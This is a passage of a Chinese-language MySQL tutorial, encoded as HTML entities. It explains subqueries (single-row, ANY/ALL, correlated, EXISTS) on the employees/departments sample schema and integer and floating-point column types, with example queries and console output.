// &#x67E5;&#x8BE2;&#x6700;&#x4F4E;&#x5DE5;&#x8D44;&#x5927;&#x4E8E;50&#x53F7;&#x90E8;&#x95E8;&#x6700;&#x4F4E;&#x5DE5;&#x8D44;&#x7684;&#x90E8;&#x95E8;id&#x548C;&#x5176;&#x6700;&#x4F4E;&#x5DE5;&#x8D44;
SELECT department_id, MIN(salary) AS dept_lowest_salary FROM employees WHERE department_id IS NOT NULL GROUP BY department_id HAVING dept_lowest_salary &gt; ( SELECT MIN(salary) FROM employees WHERE department_id = 50);
// CASE&#x4E2D;&#x7684;&#x5B50;&#x67E5;&#x8BE2;
// &#x663E;&#x793A;&#x5458;&#x5DE5;&#x7684;employee_id,last_name&#x548C;location.&#x5176;&#x4E2D;,&#x82E5;&#x5458;&#x5DE5;department_id&#x4E0E;location_id&#x4E3A;1800&#x7684;department_id&#x76F8;&#x540C;,&#x5219;location&#x4E3A;&apos;Canada&apos;,&#x5176;&#x4F59;&#x5219;&#x4E3A;&apos;USA&apos;
SELECT employee_id, last_name, ( CASE department_id WHEN ( SELECT department_id FROM departments WHERE location_id = 1800 ) THEN &apos;Canada&apos; ELSE &apos;USA&apos; END ) &quot;location&quot; FROM employees;
// &#x5B50;&#x67E5;&#x8BE2;&#x4E2D;&#x7684;&#x7A7A;&#x503C;&#x95EE;&#x9898; =&gt; &#x5185;&#x67E5;&#x8BE2;&#x7A7A;&#x503C;&#x4E0D;&#x62A5;&#x9519;,&#x4EC5;&#x65E0;&#x7ED3;&#x679C;
SELECT last_name, job_id FROM employees WHERE job_id = ( SELECT job_id FROM employees WHERE last_name = &apos;Haas&apos; );
// &#x975E;&#x6CD5;&#x4F7F;&#x7528;&#x5B50;&#x67E5;&#x8BE2; =&gt; ERROR 1242 (21000): Subquery returns more than 1 row
SELECT employee_id, last_name FROM employees WHERE salary = ( SELECT MIN( salary ) FROM employees GROUP BY department_id );
// &#x975E;&#x6CD5;&#x4F7F;&#x7528;&#x5B50;&#x67E5;&#x8BE2; =&gt; &#x6B63;&#x89E3;
// &#x67E5;&#x51FA;&#x54EA;&#x4E9B;&#x5458;&#x5DE5;&#x662F;&#x7B49;&#x4E8E;&#x4E0B;&#x9762;&#x5404;&#x90E8;&#x95E8;&#x6700;&#x4F4E;&#x5DE5;&#x8D44;&#x7684;&#x4EBA;
SELECT employee_id, last_name FROM employees WHERE salary IN ( SELECT MIN( salary ) FROM employees GROUP BY department_id );
</code></pre>
<h3 id="%E5%A4%9A%E8%A1%8C%E5%AD%90%E6%9F%A5%E8%AF%A2">&#x591A;&#x884C;&#x5B50;&#x67E5;&#x8BE2;</h3>
<pre><code class="language-javascript">/*
&#x591A;&#x884C;&#x5B50;&#x67E5;&#x8BE2;&#x4E5F;&#x79F0;&#x4E3A;&#x96C6;&#x5408;&#x6BD4;&#x8F83;&#x5B50;&#x67E5;&#x8BE2;
&#x5B50;&#x67E5;&#x8BE2;&#x8FD4;&#x56DE;&#x591A;&#x884C;&#x6570;&#x636E;
&#x4F7F;&#x7528;&#x591A;&#x884C;&#x6BD4;&#x8F83;&#x64CD;&#x4F5C;&#x7B26;
IN =&gt; &#x7B49;&#x4E8E;&#x5217;&#x8868;&#x4E2D;&#x7684; &#x4EFB;&#x610F;&#x4E00;&#x4E2A;
ANY =&gt; &#x9700;&#x8981;&#x548C;&#x5355;&#x884C;&#x6BD4;&#x8F83;&#x64CD;&#x4F5C;&#x7B26;&#x4E00;&#x8D77;&#x4F7F;&#x7528;&#xFF0C;&#x548C;&#x5B50;&#x67E5;&#x8BE2;&#x8FD4;&#x56DE;&#x7684; &#x67D0;&#x4E00;&#x4E2A; &#x503C;&#x6BD4;&#x8F83;
ALL =&gt; &#x9700;&#x8981;&#x548C;&#x5355;&#x884C;&#x6BD4;&#x8F83;&#x64CD;&#x4F5C;&#x7B26;&#x4E00;&#x8D77;&#x4F7F;&#x7528;&#xFF0C;&#x548C;&#x5B50;&#x67E5;&#x8BE2;&#x8FD4;&#x56DE;&#x7684; &#x6240;&#x6709; &#x503C;&#x6BD4;&#x8F83;
SOME =&gt; &#x5B9E;&#x9645;&#x4E0A;&#x662F;ANY&#x7684;&#x522B;&#x540D;&#xFF0C;&#x4F5C;&#x7528;&#x76F8;&#x540C;&#xFF0C;&#x4E00;&#x822C;&#x5E38;&#x4F7F;&#x7528;ANY
*/
// &#x8FD4;&#x56DE;&#x5176;&#x5B83;job_id&#x4E2D;&#x6BD4;job_id&#x4E3A;&apos;IT_PROG&apos;&#x90E8;&#x95E8;&#x4EFB;&#x4E00;&#x5DE5;&#x8D44;&#x4F4E;&#x7684;&#x5458;&#x5DE5;&#x7684;&#x5458;&#x5DE5;&#x53F7;&#x3001;&#x59D3;&#x540D;&#x3001;job_id &#x4EE5;&#x53CA;salary
SELECT employee_id,last_name,job_id,salary FROM employees WHERE job_id &lt;&gt; &apos;IT_PROG&apos; AND salary &lt; ANY (SELECT salary FROM employees WHERE job_id = &apos;IT_PROG&apos;) AND job_id &lt;&gt; &apos;IT_PROG&apos;;
// &#x8FD4;&#x56DE;&#x5176;&#x5B83;job_id&#x4E2D;&#x6BD4;job_id&#x4E3A;&#x2018;IT_PROG&#x2019;&#x90E8;&#x95E8;&#x6240;&#x6709;&#x5DE5;&#x8D44;&#x90FD;&#x4F4E;&#x7684;&#x5458;&#x5DE5;&#x7684;&#x5458;&#x5DE5;&#x53F7;&#x3001;&#x59D3;&#x540D;&#x3001;job_id&#x4EE5;&#x53CA;salary
SELECT employee_id,last_name,job_id,salary FROM employees WHERE job_id &lt;&gt; &apos;IT_PROG&apos; AND salary &lt; ALL (SELECT salary FROM employees WHERE job_id = &apos;IT_PROG&apos;) AND job_id &lt;&gt; &apos;IT_PROG&apos;;
// &#x67E5;&#x8BE2;&#x5E73;&#x5747;&#x5DE5;&#x8D44;&#x6700;&#x4F4E;&#x7684;&#x90E8;&#x95E8;id
// &#x65B9;&#x5F0F;1
SELECT department_id, AVG(salary) FROM employees GROUP BY department_id HAVING AVG(salary) = ( SELECT MIN(avg_salary) FROM ( SELECT AVG(salary) avg_salary FROM employees GROUP BY department_id ) AS avg_salary_table);
// &#x65B9;&#x5F0F;2
SELECT department_id FROM employees GROUP BY department_id HAVING AVG(salary) &lt;= ALL ( SELECT AVG(salary) FROM employees GROUP BY department_id );
</code></pre>
<h3 id="%E7%9B%B8%E5%85%B3%E5%AD%90%E6%9F%A5%E8%AF%A2">&#x76F8;&#x5173;&#x5B50;&#x67E5;&#x8BE2;</h3>
<p>&#x5982;&#x679C;&#x5B50;&#x67E5;&#x8BE2;&#x7684;&#x6267;&#x884C;&#x4F9D;&#x8D56;&#x4E8E;&#x5916;&#x90E8;&#x67E5;&#x8BE2;&#xFF0C;&#x901A;&#x5E38;&#x60C5;&#x51B5;&#x4E0B;&#x90FD;&#x662F;&#x56E0;&#x4E3A;&#x5B50;&#x67E5;&#x8BE2;&#x4E2D;&#x7684;&#x8868;&#x7528;&#x5230;&#x4E86;&#x5916;&#x90E8;&#x7684;&#x8868;&#xFF0C;&#x5E76;&#x8FDB;&#x884C;&#x4E86;&#x6761;&#x4EF6;&#x5173;&#x8054;&#xFF0C;&#x56E0;&#x6B64;&#x6BCF;&#x6267;&#x884C;&#x4E00;&#x6B21;&#x5916;&#x90E8;&#x67E5;&#x8BE2;&#xFF0C;&#x5B50;&#x67E5;&#x8BE2;&#x90FD;&#x8981;&#x91CD;&#x65B0;&#x8BA1;&#x7B97;&#x4E00;&#x6B21;&#xFF0C;&#x8FD9;&#x6837;&#x7684;&#x5B50;&#x67E5;&#x8BE2;&#x5C31;&#x79F0;&#x4E4B;&#x4E3A;&#x5173;&#x8054;&#x5B50;&#x67E5;&#x8BE2;&#x3002;</p>
<pre><code class="language-javascript">/*
&#x76F8;&#x5173;&#x5B50;&#x67E5;&#x8BE2; =&gt; &#x5B50;&#x67E5;&#x8BE2;&#x4E2D;&#x4F7F;&#x7528;&#x4E3B;&#x67E5;&#x8BE2;&#x4E2D;&#x7684;&#x5217;
&#x5728;SELECT&#x4E2D;&#x9664;&#x4E86;GROUP BY &#x548C; LIMIT&#x4E4B;&#x5916;,&#x5176;&#x4ED6;&#x4F4D;&#x7F6E;&#x90FD;&#x53EF;&#x4EE5;&#x58F0;&#x660E;&#x5B50;&#x67E5;&#x8BE2;
*/
// &#x67E5;&#x8BE2;&#x5458;&#x5DE5;&#x4E2D;&#x5DE5;&#x8D44;&#x5927;&#x4E8E;&#x516C;&#x53F8;&#x5E73;&#x5747;&#x5DE5;&#x8D44;&#x7684;&#x5458;&#x5DE5;&#x7684; last_name,salary &#x548C;&#x5176; department_id
SELECT last_name,salary,department_id FROM employees WHERE salary &gt; ( SELECT AVG(salary) FROM employees);
// &#x67E5;&#x8BE2;&#x5458;&#x5DE5;&#x4E2D;&#x5DE5;&#x8D44;&#x5927;&#x4E8E;&#x672C;&#x90E8;&#x95E8;&#x5E73;&#x5747;&#x5DE5;&#x8D44;&#x7684;&#x5458;&#x5DE5;&#x7684; last_name,salary &#x548C;&#x5176; department_id
// &#x65B9;&#x5F0F;&#x4E00; =&gt; &#x76F8;&#x5173;&#x67E5;&#x8BE2;
SELECT last_name,salary,department_id FROM employees e1 WHERE salary &gt; ( SELECT AVG(salary) FROM employees e2 WHERE department_id = e1.department_id);
// &#x65B9;&#x5F0F;&#x4E8C; =&gt; FROM&#x5B50;&#x67E5;&#x8BE2;
SELECT e.last_name,e.salary,e.department_id FROM employees e,(SELECT department_id,AVG(salary) avg_sal FROM employees GROUP BY department_id) t_debt_avg_sal WHERE e.department_id = t_debt_avg_sal.department_id AND e.salary &gt; t_debt_avg_sal.avg_sal;
// &#x67E5;&#x8BE2;&#x5458;&#x5DE5;&#x7684;id,salary,&#x6309;&#x7167;department_name &#x6392;&#x5E8F;
// &#x65B9;&#x5F0F;&#x4E00; =&gt; &#x76F8;&#x5173;&#x5B50;&#x67E5;&#x8BE2;
SELECT employee_id, salary FROM employees emp ORDER BY ( SELECT department_name FROM departments dept WHERE emp.department_id = dept.department_id ) ASC;
// &#x65B9;&#x5F0F;&#x4E8C; =&gt; &#x8868;&#x8FDE;&#x63A5;
SELECT employee_id, salary, department_name FROM employees emp LEFT JOIN departments dept ON emp.department_id = dept.department_id ORDER BY department_name ASC;
// &#x82E5;employees&#x8868;&#x4E2D;employee_id&#x4E0E;job_history&#x8868;&#x4E2D;employee_id&#x76F8;&#x540C;&#x7684;&#x6570;&#x76EE;&#x4E0D;&#x5C0F;&#x4E8E;2&#x5219;&#x8F93;&#x51FA;&#x8FD9;&#x4E9B;&#x76F8;&#x540C;id&#x7684;&#x5458;&#x5DE5;&#x7684;employee_id,last_name&#x548C;&#x5176;job_id
SELECT e.employee_id,last_name,e.job_id FROM employees e WHERE 2 &lt;= (SELECT COUNT(*) FROM job_history j WHERE e.employee_id = j.employee_id);
</code></pre>
<p>&#x5173;&#x8054;&#x5B50;&#x67E5;&#x8BE2;&#x5E38;&#x4F1A;&#x548C; EXISTS &#x64CD;&#x4F5C;&#x7B26;&#x4E00;&#x8D77;&#x4F7F;&#x7528;&#xFF0C;&#x4EE5;&#x4FBF;&#x68C0;&#x67E5;&#x5728;&#x5B50;&#x67E5;&#x8BE2;&#x4E2D;&#x662F;&#x5426;&#x5B58;&#x5728;&#x6EE1;&#x8DB3;&#x6761;&#x4EF6;&#x7684;&#x884C;&#x3002;&#x82E5;&#x5B50;&#x67E5;&#x8BE2;&#x4E2D;&#x5B58;&#x5728;&#x6EE1;&#x8DB3;&#x6761;&#x4EF6;&#x7684;&#x884C;&#xFF0C;&#x6761;&#x4EF6;&#x8FD4;&#x56DE; TRUE&#xFF0C;&#x505C;&#x6B62;&#x5728;&#x5B50;&#x67E5;&#x8BE2;&#x4E2D;&#x7EE7;&#x7EED;&#x67E5;&#x627E;&#x5E76;&#x8FD4;&#x56DE;&#x7B26;&#x5408;&#x7684;&#x8BB0;&#x5F55;&#xFF1B;&#x76F8;&#x53CD;&#x5219;&#x8FD4;&#x56DE; FALSE &#x5E76;&#x7EE7;&#x7EED;&#x67E5;&#x627E;&#x3002;NOTEXISTS &#x5173;&#x952E;&#x5B57;&#x8868;&#x793A;&#x5982;&#x679C;&#x4E0D;&#x5B58;&#x5728;&#x67D0;&#x79CD;&#x6761;&#x4EF6;&#xFF0C;&#x5219;&#x8FD4;&#x56DE; TRUE&#xFF0C;&#x5426;&#x5219;&#x8FD4;&#x56DE; FALSE&#x3002;</p>
<pre><code class="language-javascript">// &#x67E5;&#x8BE2;&#x516C;&#x53F8;&#x7BA1;&#x7406;&#x8005;&#x7684;employee_id,last_name,job_id,department_id&#x4FE1;&#x606F;
// &#x65B9;&#x5F0F;&#x4E00; =&gt; &#x81EA;&#x8FDE;&#x63A5; =&gt; &#x5C06;&#x540C;&#x4E00;&#x5F20;&#x8868;&#x770B;&#x505A;&#x4E24;&#x5F20;&#x8868;&#x8FDB;&#x884C;&#x7B49;&#x503C;&#x8FDE;&#x63A5;
SELECT DISTINCT mgr.employee_id, mgr.last_name, mgr.job_id, mgr.department_id FROM employees emp JOIN employees mgr ON emp.manager_id = mgr.employee_id;
// &#x65B9;&#x5F0F;&#x4E8C; =&gt; &#x5B50;&#x67E5;&#x8BE2;&#x7684;&#x65B9;&#x5F0F; =&gt; &#x5148;&#x5C06;&#x6240;&#x6709;&#x7684;manager_id&#x67E5;&#x51FA;
SELECT employee_id, last_name, job_id, department_id FROM employees WHERE employee_id IN ( SELECT DISTINCT manager_id FROM employees );
// &#x65B9;&#x5F0F;&#x4E09; =&gt; EXISTS
SELECT employee_id, last_name, job_id, department_id FROM employees e1 WHERE  EXISTS ( SELECT 1 FROM employees e2 WHERE e1.employee_id = e2.manager_id);
// &#x67E5;&#x8BE2;departments&#x8868;&#x4E2D;&#x4E0D;&#x5B58;&#x5728;&#x4E8E;employees&#x8868;&#x4E2D;&#x7684;&#x90E8;&#x95E8;&#x7684;department_id&#x548C;department_name (employees&#x8868;&#x4E2D;&#x90E8;&#x95E8;id&#x4E3A;NULL&#x7684;&#x60C5;&#x51B5;)
// &#x65B9;&#x5F0F;&#x4E00; =&gt; &#x53F3;&#x5916;&#x8FDE;&#x63A5;
SELECT dept.department_id, dept.department_name, emp.department_id FROM departments dept LEFT JOIN employees emp USING (department_id) WHERE emp.department_id IS NULL;
// &#x65B9;&#x5F0F;&#x4E8C; =&gt; NOT EXISTS
SELECT department_id, department_name FROM departments d WHERE NOT EXISTS (SELECT * FROM employees emp WHERE emp.department_id = d.department_id);
</code></pre>
<p>&#x5728;&#x8BB8;&#x591A;&#x6570;&#x636E;&#x5E93;&#x5904;&#x7406;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x5BF9;&#x4E8E;&#x81EA;&#x8FDE;&#x63A5;&#x7684;&#x5904;&#x7406;&#x901F;&#x5EA6;&#x8981;&#x6BD4;&#x5B50;&#x67E5;&#x8BE2;&#x5FEB;&#x5F97;&#x591A;&#x3002;&#x53EF;&#x4EE5;&#x8FD9;&#x6837;&#x7406;&#x89E3;&#xFF0C;&#x5B50;&#x67E5;&#x8BE2;&#x5B9E;&#x9645;&#x4E0A;&#x662F;&#x901A;&#x8FC7;&#x672A;&#x77E5;&#x8868;&#x8FDB;&#x884C;&#x67E5;&#x8BE2;&#x540E;&#x7684;&#x6761;&#x4EF6;&#x5224;&#x65AD;&#xFF0C;&#x800C;&#x81EA;&#x8FDE;&#x63A5;&#x662F;&#x901A;&#x8FC7;&#x5DF2;&#x77E5;&#x7684;&#x81EA;&#x8EAB;&#x6570;&#x636E;&#x8868;&#x8FDB;&#x884C;&#x6761;&#x4EF6;&#x5224;&#x65AD;&#xFF0C;&#x56E0;&#x6B64;&#x5728;&#x5927;&#x90E8;&#x5206;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x90FD;&#x5BF9;&#x81EA;&#x8FDE;&#x63A5;&#x5904;&#x7406;&#x8FDB;&#x884C;&#x4E86;&#x4F18;&#x5316;&#x3002;</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B">&#x6570;&#x636E;&#x7C7B;&#x578B;</h2>
<h3 id="%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B">&#x6574;&#x6570;&#x7C7B;&#x578B;</h3>
<p>&#x6574;&#x6570;&#x7C7B;&#x578B;&#x5305;&#x62EC; TINYINT&#x3001;SMALLINT&#x3001;MEDIUMINT&#x3001;INT|INTEGER &#x548C; BIGINT&#x3002;&#x5982;&#x679C;&#x8D85;&#x51FA;&#x8BBE;&#x7F6E;&#x7C7B;&#x578B;&#x7684;&#x8303;&#x56F4;&#xFF0C;&#x5C31;&#x4F1A;&#x62A5;&#x9519; <code>Out of range value for column &apos;&lt;fieldName&gt;&apos; at row 1</code>&#x3002;</p>
<table>
<thead>
<tr>
<th>&#x6574;&#x6570;&#x7C7B;&#x578B;</th>
<th>&#x5B57;&#x8282;</th>
<th>&#x6709;&#x7B26;&#x53F7;&#x6570;&#x53D6;&#x503C;&#x8303;&#x56F4;</th>
<th>&#x65E0;&#x7B26;&#x53F7;&#x6570;&#x53D6;&#x503C;&#x8303;&#x56F4; (UNSIGNED)</th>
</tr>
</thead>
<tbody>
<tr>
<td>TINYINT</td>
<td>1</td>
<td>-128~127</td>
<td>0~255</td>
</tr>
<tr>
<td>SMALLINT</td>
<td>2</td>
<td>-32768~32767</td>
<td>0~65535</td>
</tr>
<tr>
<td>MEDIUMINT</td>
<td>3</td>
<td>-8388608~8388607</td>
<td>0~16777215</td>
</tr>
<tr>
<td>INT&#x3001;INTEGER</td>
<td>4</td>
<td>-2147483648~2147483647</td>
<td>0~4294967295</td>
</tr>
<tr>
<td>BIGINT</td>
<td>8</td>
<td>-9223372036854775808~9223372036854775807</td>
<td>0~18446744073709551615</td>
</tr>
</tbody>
</table>
<ul>
<li>&#x53EF;&#x9009;&#x5C5E;&#x6027;</li>
</ul>
<p>M &#x8868;&#x793A;&#x663E;&#x793A;&#x5BBD;&#x5EA6;&#xFF0C;&#x53D6;&#x503C;&#x8303;&#x56F4;&#x662F; 0~255&#x3002;&#x4F8B;&#x5982; <code>int(5)</code> &#x8868;&#x793A;&#x5F53;&#x6570;&#x636E;&#x5BBD;&#x5EA6;&#x5C0F;&#x4E8E; 5 &#x4F4D;&#x7684;&#x65F6;&#x5019;&#x5728;&#x6570;&#x5B57;&#x524D;&#x9762;&#x9700;&#x8981;&#x7528;&#x5B57;&#x7B26;&#x586B;&#x6EE1;&#x3002;&#x8BE5;&#x9879;&#x529F;&#x80FD;&#x9700;&#x8981;&#x914D;&#x5408; &quot;ZEROFILL&quot; &#x4F7F;&#x7528;&#xFF0C;&#x8868;&#x793A;&#x7528; &quot;0&quot; &#x586B;&#x6EE1;&#x5BBD;&#x5EA6;&#xFF0C;&#x5426;&#x5219;&#x6307;&#x5B9A;&#x663E;&#x793A;&#x5BBD;&#x5EA6;&#x65E0;&#x6548;&#x3002;&#x503C;&#x5F97;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF0C;&#x82E5;&#x8BBE;&#x7F6E;&#x4E86;&#x663E;&#x793A;&#x5BBD;&#x5EA6;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x63D2;&#x5165;&#x7684;&#x6570;&#x636E;&#x5BBD;&#x5EA6;&#x8D85;&#x8FC7;&#x663E;&#x793A;&#x5BBD;&#x5EA6;&#x9650;&#x5236;&#x5E76;&#x4E0D;&#x4F1A;&#x5BF9;&#x63D2;&#x5165;&#x7684;&#x6570;&#x636E;&#x6709;&#x4EFB;&#x4F55;&#x5F71;&#x54CD;&#xFF0C;&#x8FD8;&#x662F;&#x6309;&#x7167;&#x7C7B;&#x578B;&#x7684;&#x5B9E;&#x9645;&#x5BBD;&#x5EA6;&#x8FDB;&#x884C;&#x4FDD;&#x5B58;&#xFF0C;&#x5373;&#x663E;&#x793A;&#x5BBD;&#x5EA6;&#x4E0E;&#x7C7B;&#x578B;&#x53EF;&#x4EE5;&#x5B58;&#x50A8;&#x7684;&#x503C;&#x8303;&#x56F4;&#x65E0;&#x5173;&#x3002;&#x4ECE; MySQL 8.0.17 &#x5F00;&#x59CB;&#xFF0C;&#x6574;&#x6570;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x4E0D;&#x63A8;&#x8350;&#x4F7F;&#x7528;&#x663E;&#x793A;&#x5BBD;&#x5EA6;&#x5C5E;&#x6027;&#x3002;&#x6574;&#x578B;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x53EF;&#x4EE5;&#x5728;&#x5B9A;&#x4E49;&#x8868;&#x7ED3;&#x6784;&#x65F6;&#x6307;&#x5B9A;&#x6240;&#x9700;&#x8981;&#x7684;&#x663E;&#x793A;&#x5BBD;&#x5EA6;&#xFF0C;&#x5982;&#x679C;&#x4E0D;&#x6307;&#x5B9A;&#xFF0C;&#x5219;&#x7CFB;&#x7EDF;&#x4E3A;&#x6BCF;&#x4E00;&#x79CD;&#x7C7B;&#x578B;&#x6307;&#x5B9A;&#x9ED8;&#x8BA4;&#x7684;&#x5BBD;&#x5EA6;&#x503C;&#x3002;</p>
<pre><code class="language-sql"># MySQL5.7
mysql&gt; CREATE TABLE test_int1 ( x TINYINT,&#x3000;y SMALLINT,&#x3000;z MEDIUMINT,&#x3000;m INT,&#x3000;n BIGINT );
mysql&gt; desc test_int1;
+-------+--------------+------+-----+---------+-------+
| Field | Type         | Null | Key | Default | Extra |
+-------+--------------+------+-----+---------+-------+
|   x   | tinyint(4)   | YES  |     | NULL    |       |
| &#x3000;y   | smallint(6)  | YES  |     | NULL    |       |
| &#x3000;z   | mediumint(9) | YES  |     | NULL    |       |
| &#x3000;m   | int(11)      | YES  |     | NULL    |       |
| &#x3000;n   | bigint(20)   | YES  |     | NULL    |       |
+-------+--------------+------+-----+---------+-------+
5 rows in set (0.00 sec)
</code></pre>
<pre><code class="language-sql"># &#x663E;&#x793A;&#x5BBD;&#x5EA6;5&#x4F4D;,&#x4E0D;&#x8DB3;&#x65F6;0&#x586B;&#x5145;
# &#x4F7F;&#x7528;ZEROFILL&#x81EA;&#x52A8;&#x6DFB;&#x52A0;UNSIGNED
mysql&gt; CREATE TABLE test_int2(f1 INT,f2 INT(5),f3 INT(5) ZEROFILL);
mysql&gt; DESC test_ini2;
mysql&gt; INSERT INTO test_int2(f1,f2) VALUES (123,123),(123456,123456);
mysql&gt; INSERT INTO test_int2(f3) VALUES (123),(123456);
mysql&gt; SELECT * FROM test_int2;
+--------+--------+--------+
| f1     | f2     | f3     |
+--------+--------+--------+
|    123 |    123 |   NULL |
| 123456 | 123456 |   NULL |
|   NULL |   NULL |  00123 |
|   NULL |   NULL | 123456 |
+--------+--------+--------+
4 rows in set (0.00 sec)
</code></pre>
<p>&#x6240;&#x6709;&#x7684;&#x6574;&#x6570;&#x7C7B;&#x578B;&#x90FD;&#x6709;&#x4E00;&#x4E2A;&#x53EF;&#x9009;&#x7684; UNSIGNED &#x65E0;&#x7B26;&#x53F7;&#x5C5E;&#x6027;&#x3002;&#x65E0;&#x7B26;&#x53F7;&#x6574;&#x6570;&#x7C7B;&#x578B;&#x7684;&#x6700;&#x5C0F;&#x53D6;&#x503C;&#x4E3A; 0&#xFF0C;&#x5373;&#x975E;&#x8D1F;&#x3002;&#x82E5;&#x9700;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x4FDD;&#x5B58;&#x975E;&#x8D1F;&#x6574;&#x6570;&#x503C;&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x5C06;&#x6574;&#x6570;&#x7C7B;&#x578B;&#x8BBE;&#x7F6E;&#x4E3A;&#x65E0;&#x7B26;&#x53F7;&#x7C7B;&#x578B;&#x3002;int &#x7C7B;&#x578B;&#x9ED8;&#x8BA4;&#x663E;&#x793A;&#x5BBD;&#x5EA6;&#x4E3A; <code>int(11)</code>&#xFF0C;&#x65E0;&#x7B26;&#x53F7; int &#x7C7B;&#x578B;&#x9ED8;&#x8BA4;&#x663E;&#x793A;&#x5BBD;&#x5EA6;&#x4E3A; <code>int(10)</code>&#x3002;</p>
<pre><code class="language-sql">mysql&gt; CREATE TABLE test_int3(f1 INT UNSIGNED);
mysql&gt; desc test_int3;
mysql&gt; INSERT INTO test_int3 VALUES(4294967295);
mysql&gt; INSERT INTO test_int3 VALUES(4294967296);
mysql&gt; SELECT * FROm test_int3;
+------------+
| f1         |
+------------+
| 4294967295 |
+------------+
</code></pre>
<ul>
<li>&#x9002;&#x7528;&#x573A;&#x666F;</li>
</ul>
<p>TINYINT =&gt; &#x4E00;&#x822C;&#x7528;&#x4E8E;&#x679A;&#x4E3E;&#x6570;&#x636E;&#xFF0C;&#x6BD4;&#x5982;&#x7CFB;&#x7EDF;&#x8BBE;&#x5B9A;&#x53D6;&#x503C;&#x8303;&#x56F4;&#x5F88;&#x5C0F;&#x4E14;&#x56FA;&#x5B9A;&#x7684;&#x573A;&#x666F;&#x3002;<br>
SMALLINT =&gt; &#x53EF;&#x4EE5;&#x7528;&#x4E8E;&#x8F83;&#x5C0F;&#x8303;&#x56F4;&#x7684;&#x7EDF;&#x8BA1;&#x6570;&#x636E;&#xFF0C;&#x6BD4;&#x5982;&#x7EDF;&#x8BA1;&#x5DE5;&#x5382;&#x7684;&#x56FA;&#x5B9A;&#x8D44;&#x4EA7;&#x5E93;&#x5B58;&#x6570;&#x91CF;&#x7B49;&#x3002;<br>
MEDIUMINT =&gt; &#x7528;&#x4E8E;&#x8F83;&#x5927;&#x6574;&#x6570;&#x7684;&#x8BA1;&#x7B97;&#xFF0C;&#x6BD4;&#x5982;&#x8F66;&#x7AD9;&#x6BCF;&#x65E5;&#x7684;&#x5BA2;&#x6D41;&#x91CF;&#x7B49;&#x3002;<br>
INT&#x3001;INTEGER =&gt; &#x53D6;&#x503C;&#x8303;&#x56F4;&#x8DB3;&#x591F;&#x5927;&#xFF0C;&#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#x4E0D;&#x7528;&#x8003;&#x8651;&#x8D85;&#x9650;&#x95EE;&#x9898;&#xFF0C;&#x7528;&#x5F97;&#x6700;&#x591A;&#x3002;&#x6BD4;&#x5982;&#x5546;&#x54C1;&#x7F16;&#x53F7;&#x3002;<br>
BIGINT =&gt; &#x53EA;&#x6709;&#x5F53;&#x5904;&#x7406;&#x7279;&#x522B;&#x5DE8;&#x5927;&#x7684;&#x6574;&#x6570;&#x65F6;&#x624D;&#x4F1A;&#x7528;&#x5230;&#x3002;&#x6BD4;&#x5982;&#x5927;&#x578B;&#x95E8;&#x6237;&#x7F51;&#x7AD9;&#x70B9;&#x51FB;&#x91CF;&#x3001;&#x53CC;&#x5341;&#x4E00;&#x7684;&#x4EA4;&#x6613;&#x91CF;&#x3001;&#x8BC1;&#x5238;&#x516C;&#x53F8;&#x884D;&#x751F;&#x4EA7;&#x54C1;&#x6301;&#x4ED3;&#x7B49;&#x3002;</p>
<h3 id="%E6%B5%AE%E7%82%B9%E7%B1%BB%E5%9E%8B">&#x6D6E;&#x70B9;&#x7C7B;&#x578B;</h3>
<p>&#x652F;&#x6301;&#x7684;&#x6D6E;&#x70B9;&#x6570;&#x7C7B;&#x578B;&#x5206;&#x522B;&#x662F;&#x5355;&#x7CBE;&#x5EA6;&#x6D6E;&#x70B9;&#x6570; FLOAT&#x3001;&#x53CC;&#x7CBE;&#x5EA6;&#x6D6E;&#x70B9;&#x6570; DOUBLE&#x3001;&#x9ED8;&#x8BA4; DOUBLE &#x7684; REAL&#x3002;&#x82E5;&#x628A;&#x6A21;&#x5F0F;&#x8BBE;&#x5B9A;&#x4E3A;&#x542F;&#x7528; &quot;REAL_AS_FLOAT&quot;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x8BA4;&#x4E3A; REAL &#x662F; FLOAT&#x3002;</p>
<pre><code class="language-sql"># mysql&#x542F;&#x7528;REAL_AS_FLOAT
SET sql_mode = &#x201C;REAL_AS_FLOAT&#x201D;;
</code></pre>
<p>&#x6D6E;&#x70B9;&#x6570;&#x7C7B;&#x578B;&#x7684;&#x65E0;&#x7B26;&#x53F7;&#x6570;&#x53D6;&#x503C;&#x8303;&#x56F4;&#xFF0C;&#x53EA;&#x76F8;&#x5F53;&#x4E8E;&#x6709;&#x7B26;&#x53F7;&#x6570;&#x53D6;&#x503C;&#x8303;&#x56F4;&#x7684;&#x4E00;&#x534A;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x53EA;&#x76F8;&#x5F53;&#x4E8E;&#x6709;&#x7B26;&#x53F7;&#x6570;&#x53D6;&#x503C;&#x8303;&#x56F4;&#x5927;&#x4E8E;&#x7B49;&#x4E8E;&#x96F6;&#x7684;&#x90E8;&#x5206;&#x3002;&#x8FD9;&#x662F;&#x56E0;&#x4E3A;&#x5B58;&#x50A8;&#x6D6E;&#x70B9;&#x6570;&#x7684;&#x683C;&#x5F0F;&#x4E3A;&#x7B26;&#x53F7; S&#x3001;&#x5C3E;&#x6570; M&#x548C;&#x9636;&#x7801; 